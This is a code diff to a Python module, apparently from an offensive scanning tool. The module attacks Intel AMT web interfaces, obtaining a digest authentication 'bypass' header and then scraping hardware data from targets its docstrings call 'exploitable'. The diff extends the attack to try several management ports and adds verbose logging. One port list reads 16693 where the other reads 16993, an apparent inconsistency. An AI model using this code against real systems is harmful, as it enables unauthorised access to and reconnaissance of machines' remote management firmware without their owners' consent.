@@ -14,18 +14,28 @@ from lxml import html
 from var.auto_issue.github import request_issue_creation
 
 
-def __get_auth_headers(target, port=16992, source=None, agent=None, proxy=None):
+def __get_auth_headers(target, ports=(16992, 16693, 693, 692), **kwargs):
     """
     get the authorization headers from the URL
     """
+    source = kwargs.get("source", None)
+    proxy, agent, verbose = kwargs.get("proxy", None), kwargs.get("agent", None), kwargs.get("verbose", False)
     if not source or 'WWW-Authenticate' not in source.headers['WWW-Authenticate']:
         logger.info(set_color(
             "header value not established, attempting to get bypass..."
         ))
-        source = requests.get("http://{0}:{1}/index.htm".format(target, port), timeout=10, headers={
-            'connection': 'close', 'user-agent': agent
-        }, proxies=proxy)
-        return source
+        for port in ports:
+            try:
+                if verbose:
+                    logger.debug(set_color(
+                        "trying on port {}...".format(port), level=10
+                    ))
+                source = requests.get("http://{0}:{1}/index.htm".format(target, port), timeout=10, headers={
+                    'connection': 'close', 'user-agent': agent
+                }, proxies=proxy)
+                return source
+            except Exception:
+                pass
     # Get digest and nonce and return the new header
     if 'WWW-Authenticate' in source.headers:
         logger.info(set_color(
@@ -46,28 +56,36 @@ def __get_auth_headers(target, port=16992, source=None, agent=None, proxy=None):
         return None
 
 
-def __get_raw_data(target, page, agent=None, proxy=None):
+def __get_raw_data(target, page, agent=None, proxy=None, **kwargs):
     """
     collect all the information from an exploitable target
     """
+    possible_ports = (16992, 16993, 693, 692)
+    verbose = kwargs.get("verbose", False)
     logger.info(set_color(
-        "getting raw information..."
+        "attempting to get raw hardware information..."
     ))
-    return requests.get("http://{0}:16992/{1}.htm".format(target, page),
-                        headers={
-                            'connection': 'close',
-                            'Authorization': __get_auth_headers(target),
-                            'user-agent': agent
-                        },
-                        proxies=proxy
-                        )
+    for port in possible_ports:
+        try:
+            if verbose:
+                logger.debug(set_color(
+                    "trying on port {}...".format(port), level=10
+                ))
+            return requests.get("http://{0}:{1}/{2}.htm".format(target, port, page),
+                                headers={
+                                    'connection': 'close',
+                                    'Authorization': __get_auth_headers(target, verbose=verbose),
+                                    'user-agent': agent
+                                }, proxies=proxy)
+        except Exception:
+            pass
 
 
-def __get_hardware(target, agent=None, proxy=None):
+def __get_hardware(target, agent=None, proxy=None, verbose=False):
     """
     collect all the hardware information from an exploitable target
     """
-    req = __get_raw_data(target, 'hw-sys', agent=agent, proxy=proxy)
+    req = __get_raw_data(target, 'hw-sys', agent=agent, proxy=proxy, verbose=verbose)
     if not req.status_code == 200:
         return None
     logger.info(set_color(
@@ -76,6 +94,9 @@ def __get_hardware(target, agent=None, proxy=None):
     tree = html.fromstring(req.content)
     raw = tree.xpath('//td[@class="r1"]/text()')
     bios_functions = tree.xpath('//td[@class="r1"]/table//td/text()')
+    # find the hardware information
+    # and output the hardware data
+    # from the raw data found
     data = {
         'platform': {
             'model': raw[0],
@@ -107,6 +128,7 @@ def main_intel_amt(url, agent=None, proxy=None, **kwargs):
     main attack method to be called
     """
     do_ip_address = kwargs.get("do_ip", False)
+    verbose = kwargs.get("verbose", False)
     proxy = proxy_string_to_dict(proxy) or None
     agent = agent or DEFAULT_USER_AGENT
     if do_ip_address:
@@ -132,7 +154,7 @@ def main_intel_amt(url, agent=None, proxy=None, **kwargs):
         "attempting to connect to '{}' and get hardware info...".format(url)
     ))
     try:
-        json_data = __get_hardware(url, agent=agent, proxy=proxy)
+        json_data = __get_hardware(url, agent=agent, proxy=proxy, verbose=verbose)
         if json_data is None:
             logger.error(set_color(
                 "unable to get any information, skipping...", level=40
@@ -164,6 +186,6 @@ def main_intel_amt(url, agent=None, proxy=None, **kwargs):
             pass
         else:
             logger.exception(set_color(
-                "ran into exception '{}', cannot continue...".format(e)
+                "ran into exception '{}', cannot continue...".format(e), level=50
             ))
             request_issue_creation()
